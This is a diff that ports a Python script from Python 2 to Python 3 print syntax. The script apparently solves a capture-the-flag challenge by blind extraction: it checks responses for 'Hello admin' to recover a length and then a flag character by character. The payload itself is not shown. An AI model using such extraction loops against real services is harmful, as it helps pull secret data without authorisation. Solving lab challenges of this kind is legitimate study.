@@ -13,9 +13,9 @@ while 1:
     html_data = response.text
     print(response.url)
     if(html_data.find("Hello admin") != -1):
-        print "Hello admin"
+        print ("Hello admin")
         length -= 1
-        print "length = "+str(length)
+        print ("length = "+str(length))
         break
     else:
         length+=1
@@ -28,7 +28,7 @@ for i in range(1,length+1):
         html_data = response.text
         print(response.url)
         if (html_data.find("Hello admin") != -1):
-            print "Hello admin"
+            print ("Hello admin")
             flag+=chr(j)
-            print flag
+            print (flag)
             break
